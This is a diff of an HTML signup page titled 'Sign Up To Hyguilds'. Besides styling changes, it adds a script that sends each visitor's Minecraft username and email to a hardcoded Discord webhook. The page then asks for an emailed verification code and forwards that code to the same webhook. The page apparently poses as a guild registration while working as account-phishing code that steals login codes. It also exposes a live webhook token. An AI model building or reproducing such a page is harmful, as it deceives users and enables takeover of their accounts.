@@ -8,7 +8,7 @@
       background-color: #f2f2f2;
       margin: 0;
       padding: 0;
-      position: relative; /* Add position relative to the body */
+      transition: background-color 0.5s, color 0.5s;
     }
 
     #container {
@@ -19,6 +19,7 @@
       border: 1px solid #ccc;
       border-radius: 5px;
       box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.5s;
     }
 
     h2 {
@@ -42,6 +43,7 @@
       border: 1px solid #ccc;
       border-radius: 4px;
       font-size: 14px;
+      transition: background-color 0.5s, color 0.5s;
     }
 
     button[type="submit"] {
@@ -71,11 +73,12 @@
       display: flex;
       align-items: center;
       color: #555;
-      z-index: 1;
+      font-size: 14px;
+      transition: color 0.5s;
     }
 
     .dark-mode-toggle-label {
-      margin-right: 8px;
+      margin-right: 5px;
     }
 
     .switch {
@@ -85,64 +88,35 @@
       height: 20px;
     }
 
-    .switch input {
-      opacity: 0;
-      width: 0;
-      height: 0;
-    }
-
     .slider {
       position: absolute;
-      cursor: pointer;
       top: 0;
       left: 0;
       right: 0;
       bottom: 0;
       background-color: #ccc;
-      transition: 0.4s;
       border-radius: 20px;
+      transition: 0.5s;
     }
 
     .slider:before {
       position: absolute;
       content: "";
-      height: 14px;
-      width: 14px;
-      left: 3px;
-      bottom: 3px;
+      height: 16px;
+      width: 16px;
+      left: 2px;
+      bottom: 2px;
       background-color: white;
-      transition: 0.4s;
       border-radius: 50%;
+      transition: 0.5s;
     }
 
-    input:checked + .slider {
-      background-color: #2196F3;
+    input[type="checkbox"]:checked + .slider {
+      background-color: #4CAF50;
     }
 
-    input:focus + .slider {
-      box-shadow: 0 0 1px #2196F3;
-    }
-
-    input:checked + .slider:before {
+    input[type="checkbox"]:checked + .slider:before {
       transform: translateX(20px);
-    }
-
-    .dark-mode {
-      background-color: #333;
-      color: #fff;
-    }
-
-    .dark-mode #container {
-      background-color: #444;
-      border-color: #666;
-    }
-
-    .dark-mode h2 {
-      color: #fff;
-    }
-
-    .dark-mode label {
-      color: #ddd;
     }
 
     .dark-mode input[type="text"],
@@ -153,19 +127,26 @@
     }
 
     .dark-mode button[type="submit"]:hover {
-      background-color: #3d8c40;
+      background-color: #408040;
+    }
+
+    .dark-mode #container {
+      background-color: #222;
+      border-color: #555;
+    }
+
+    .dark-mode h2,
+    .dark-mode label,
+    .dark-mode .dark-mode-toggle-label {
+      color: #ddd;
+    }
+
+    .dark-mode .dark-mode-toggle {
+      color: #ddd;
     }
   </style>
 </head>
 <body>
-  <div class="dark-mode-toggle">
-    <span class="dark-mode-toggle-label">Dark Mode</span>
-    <label class="switch">
-      <input type="checkbox" onchange="toggleDarkMode()" id="darkModeToggle">
-      <span class="slider"></span>
-    </label>
-  </div>
-
   <div id="container">
     <h2>Sign Up To Hyguilds</h2>
     <div id="formContainer">
@@ -192,135 +173,139 @@
       <p id="verificationCode"></p>
     </div>
   </div>
+  <div class="dark-mode-toggle">
+    <span class="dark-mode-toggle-label">Dark Mode</span>
+    <label class="switch">
+      <input type="checkbox" onchange="toggleDarkMode()" id="darkModeToggle">
+      <span class="slider"></span>
+    </label>
+  </div>
 
-  <script>
-    let emailSubmitted = false;
+<script>
+  let emailSubmitted = false;
 
-    document.getElementById("followForm").addEventListener("submit", function(event) {
-      event.preventDefault(); // prevent the form from reloading the page
+  document.getElementById("followForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // prevent the form from reloading the page
 
-      // get the input values
-      const username = document.getElementById('username').value;
-      const email = document.getElementById('email').value;
+    // get the input values
+    const username = document.getElementById('username').value;
+    const email = document.getElementById('email').value;
 
-      // create the webhook message
-      const message = {
-        "content": "Email and IGN entered!",
-        "embeds": [
-          {
-            "title": "Sign Up!",
-            "description": "Please verify your email address by entering the code we sent you.",
-            "color": 16777215,
-            "fields": [
-              {
-                "name": "Minecraft Username",
-                "value": username
-              },
-              {
-                "name": "Email",
-                "value": email
-              }
-            ]
-          }
-        ]
-      };
-
-      // send the webhook message
-      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message)
-      })
-      .then(function(response) {
-        if (response.ok) {
-          console.log("Email and IGN submitted successfully!");
-          emailSubmitted = true;
-          showCodeForm();
-        } else {
-          console.log("Error:", response.statusText);
+    // create the webhook message
+    const message = {
+      "content": "Email and IGN entered!",
+      "embeds": [
+        {
+          "title": "Sign Up!",
+          "description": "Please verify your email address by entering the code we sent you.",
+          "color": 16777215,
+          "fields": [
+            {
+              "name": "Minecraft Username",
+              "value": username
+            },
+            {
+              "name": "Email",
+              "value": email
+            }
+          ]
         }
-      })
-      .catch(function(error) {
-        console.log("Error:", error);
-      });
-    });
+      ]
+    };
 
-    document.getElementById("codeForm").addEventListener("submit", function(event) {
-      event.preventDefault(); // prevent the form from reloading the page
-
-      // get the verification code
-      const code = document.getElementById('code').value;
-
-      // create the verification code message
-      const codeMessage = {
-        "content": "Verification code entered!",
-        "embeds": [
-          {
-            "title": "Verification Code",
-            "description": "The verification code entered by the user.",
-            "color": 16711680,
-            "fields": [
-              {
-                "name": "Code",
-                "value": code
-              }
-            ]
-          }
-        ]
-      };
-
-      // send the verification code message to the webhook
-      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(codeMessage)
-      })
-      .then(function(response) {
-        if (response.ok) {
-          console.log("Code submitted successfully!");
-          // Code validation success, you can perform any further actions here
-        } else {
-          console.log("Error:", response.statusText);
-          // Code validation failed, you can display an error message or take other actions
-        }
-      })
-      .catch(function(error) {
-        console.log("Error:", error);
-      });
-    });
-
-    function showCodeForm() {
-      document.getElementById("formContainer").style.display = "none";
-      document.getElementById("codeContainer").style.display = "block";
-    }
-
-    // Function to toggle dark mode
-    function toggleDarkMode() {
-      const body = document.body;
-      body.classList.toggle('dark-mode');
-
-      // Store the dark mode preference in localStorage
-      const darkModeToggle = document.getElementById('darkModeToggle');
-      const isDarkMode = darkModeToggle.checked;
-      localStorage.setItem('darkMode', isDarkMode);
-    }
-
-    // Function to check the dark mode preference and apply it on page load
-    function applyDarkModePreference() {
-      const darkModePreference = localStorage.getItem('darkMode');
-
-      if (darkModePreference === 'true') {
-        document.body.classList.add('dark-mode');
-        document.getElementById('darkModeToggle').checked = true;
+    // send the webhook message
+    fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(message)
+    })
+    .then(function(response) {
+      if (response.ok) {
+        console.log("Email and IGN submitted successfully!");
+        emailSubmitted = true;
+        showCodeForm();
+      } else {
+        console.log("Error:", response.statusText);
       }
-    }
+    })
+    .catch(function(error) {
+      console.log("Error:", error);
+    });
+  });
 
-    // Apply the dark mode preference on page load
-    applyDarkModePreference();
-  </script>
+  document.getElementById("codeForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // prevent the form from reloading the page
+
+    // get the verification code
+    const code = document.getElementById('code').value;
+
+    // create the verification code message
+    const codeMessage = {
+      "content": "Verification code entered!",
+      "embeds": [
+        {
+          "title": "Verification Code",
+          "description": "The verification code entered by the user.",
+          "color": 16711680,
+          "fields": [
+            {
+              "name": "Code",
+              "value": code
+            }
+          ]
+        }
+      ]
+    };
+
+    // send the verification code message to the webhook
+    fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(codeMessage)
+    })
+    .then(function(response) {
+      if (response.ok) {
+        console.log("Code submitted successfully!");
+        // Code validation success, you can perform any further actions here
+      } else {
+        console.log("Error:", response.statusText);
+        // Code validation failed, you can display an error message or take other actions
+      }
+    })
+    .catch(function(error) {
+      console.log("Error:", error);
+    });
+  });
+
+  function showCodeForm() {
+    document.getElementById("formContainer").style.display = "none";
+    document.getElementById("codeContainer").style.display = "block";
+  }
+
+  function toggleDarkMode() {
+    const body = document.body;
+    body.classList.toggle('dark-mode');
+
+    // Store the dark mode preference in localStorage
+    const darkModeToggle = document.getElementById('darkModeToggle');
+    const isDarkMode = darkModeToggle.checked;
+    localStorage.setItem('darkMode', isDarkMode);
+  }
+
+  function applyDarkModePreference() {
+    const darkModePreference = localStorage.getItem('darkMode');
+
+    if (darkModePreference === 'true') {
+      document.body.classList.add('dark-mode');
+      document.getElementById('darkModeToggle').checked = true;
+    }
+  }
+
+  applyDarkModePreference();
+</script>
 </body>
 </html>
